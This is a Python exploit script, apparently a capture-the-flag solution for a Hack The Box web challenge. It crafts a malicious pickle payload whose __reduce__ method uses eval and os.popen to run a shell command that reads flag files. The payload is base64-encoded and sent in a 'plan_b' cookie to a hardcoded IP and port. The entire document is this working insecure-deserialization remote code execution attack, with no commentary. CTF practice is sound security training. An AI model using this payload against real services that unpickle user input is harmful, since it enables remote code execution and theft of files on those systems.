import requests
import re
import pickle
import base64

host, port = "83.136.253.59", 43107
url = f"http://{host}:{port}"

class RCE:
    def __reduce__(self):
        return eval, ('__import__("os").popen("cat flag*").read()',)

def generate_payload():
    payload = pickle.dumps({'serum': RCE()}, protocol=0)
    return base64.b64encode(payload).decode()

def send_request(url):
    cookie = generate_payload()
    cookies = {
        "plan_b": cookie
    }
    response = requests.get(url, cookies=cookies)
    flag = re.search(r'HTB\{.*?\}', response.text)
    print(flag.group())

send_request(url)
